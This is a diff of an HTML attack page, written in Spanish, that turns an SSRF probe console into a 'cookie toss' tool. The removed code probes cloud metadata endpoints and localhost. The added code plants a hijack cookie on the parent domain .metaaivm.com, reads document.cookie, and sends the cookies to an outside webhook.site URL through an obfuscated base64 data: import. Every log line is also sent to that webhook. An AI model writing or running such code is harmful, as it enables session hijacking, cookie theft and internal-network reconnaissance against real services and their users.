@@ -3,22 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SSRF Console</title>
+    <title>Cookie Toss + Console</title>
     <style>
         body { background: #111; color: #0f0; font-family: monospace; padding: 20px; }
-        #console { background: #000; border: 1px solid #333; padding: 15px; height: 400px; overflow-y: auto; white-space: pre-wrap; }
+        #console { background: #000; border: 1px solid #333; padding: 15px; height: 300px; overflow-y: auto; white-space: pre-wrap; margin-bottom: 20px; }
         .success { color: #0f0; font-weight: bold; }
         .error { color: #f00; }
         .info { color: #ff0; }
     </style>
 </head>
 <body>
-    <h1>SSRF Console (Live)</h1>
-    <div id="console">Iniciando...</div>
+    <h1>Cookie Toss Console</h1>
+    <div id="console">Iniciando ataque de cookies...</div>
 
     <script>
         const consola = document.getElementById('console');
-        
+        const webhookUrl = "https://webhook.site/e989aff5-a038-4481-bc10-b96b2a2cafde";
+
         function log(msg, className) {
             const line = document.createElement('div');
             line.className = className || '';
@@ -26,53 +27,61 @@
             consola.appendChild(line);
             consola.scrollTop = consola.scrollHeight;
             
-            // También lo enviamos al webhook para tener registro externo
+            // Enviamos el log al webhook para ver qué pasa en el servidor
             try {
-                fetch("https://webhook.site/e989aff5-a038-4481-bc10-b96b2a2cafde?log=" + encodeURIComponent(msg), { mode: 'no-cors' });
+                fetch(`${webhookUrl}?log=${encodeURIComponent(msg)}`, { mode: 'no-cors' });
             } catch(e) {}
         }
 
-        log("Iniciando pruebas de SSRF...", "info");
+        log("Iniciando inyección de cookies...", "info");
 
-        // Lista de objetivos (IPs internas y metadatos de nube)
-        const targets = [
-            "http://169.254.169.254/latest/meta-data/",
-            "http://metadata.google.internal/computeMetadata/v1/",
-            "https://localhost/",
-            "https://127.0.0.1/",
-            "https://webhook.site/e989aff5-a038-4481-bc10-b96b2a2cafde?test=" + Date.now()
-        ];
+        // 1. Intento de inyección en el dominio padre
+        try {
+            document.cookie = "muse_session_hijacked=CUENTA_2_HACKEADA; path=/; domain=.metaaivm.com; secure; SameSite=None";
+            log("✅ Intento 1: Cookie inyectada en .metaaivm.com", "success");
+        } catch (e) {
+            log("❌ Error al inyectar en .metaaivm.com: " + e.message, "error");
+        }
 
-        let completed = 0;
-        const total = targets.length;
+        // 2. Intento de inyección en el dominio actual
+        try {
+            document.cookie = "muse_session_hijacked=CUENTA_2_HACKEADA; path=/; secure; SameSite=None";
+            log("✅ Intento 2: Cookie inyectada en el dominio actual", "success");
+        } catch (e) {
+            log("❌ Error al inyectar en dominio actual: " + e.message, "error");
+        }
 
-        targets.forEach(url => {
-            log(`Probando: ${url}`, "info");
-            const start = performance.now();
-            
-            fetch(url, { mode: 'no-cors', credentials: 'omit' })
-                .then(response => {
-                    const duration = performance.now() - start;
-                    log(`✅ Conexión exitosa a ${url} (${duration.toFixed(2)}ms)`, "success");
-                })
-                .catch(error => {
-                    const duration = performance.now() - start;
-                    log(`❌ Falló ${url} (${duration.toFixed(2)}ms): ${error.message}`, "error");
-                })
-                .finally(() => {
-                    completed++;
-                    if (completed === total) {
-                        log("✅ Todas las pruebas han finalizado.", "success");
-                    }
-                });
-        });
+        // 3. Leemos las cookies actuales
+        const currentCookies = document.cookie;
+        log("Cookies actuales en document.cookie: " + (currentCookies || "(vacío)"), "info");
 
-        // Prueba de resolución DNS del lado del cliente (si el navegador lo permite)
-        log("Verificando información del navegador...", "info");
-        log(`User-Agent: ${navigator.userAgent}`);
-        log(`Origen: ${window.location.origin}`);
-        log(`Referer: ${document.referrer || '(vacío)'}`);
+        // 4. Intentamos exfiltrar las cookies al webhook
+        log("Intentando exfiltrar cookies al webhook...", "info");
         
+        try {
+            const exfilPayload = `
+                try {
+                    fetch('${webhookUrl}?cookie_toss=true', {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        body: 'Cookies: ' + document.cookie
+                    });
+                } catch(e) {}
+            `;
+            
+            const base64Payload = btoa(unescape(encodeURIComponent(exfilPayload)));
+            import("data:text/javascript;base64," + base64Payload)
+                .then(() => log("✅ Exfiltración RCE enviada.", "success"))
+                .catch((e) => log("❌ Error en RCE: " + e.message, "error"));
+
+        } catch (e) {
+            log("❌ Error al preparar exfiltración: " + e.message, "error");
+        }
+
+        // 5. Mostrar el entorno de ejecución
+        log("Entorno: Origen = " + window.location.origin, "info");
+        log("Entorno: Referrer = " + (document.referrer || "(vacío)"), "info");
+        log("Entorno: User-Agent = " + navigator.userAgent, "info");
     </script>
 </body>
 </html>
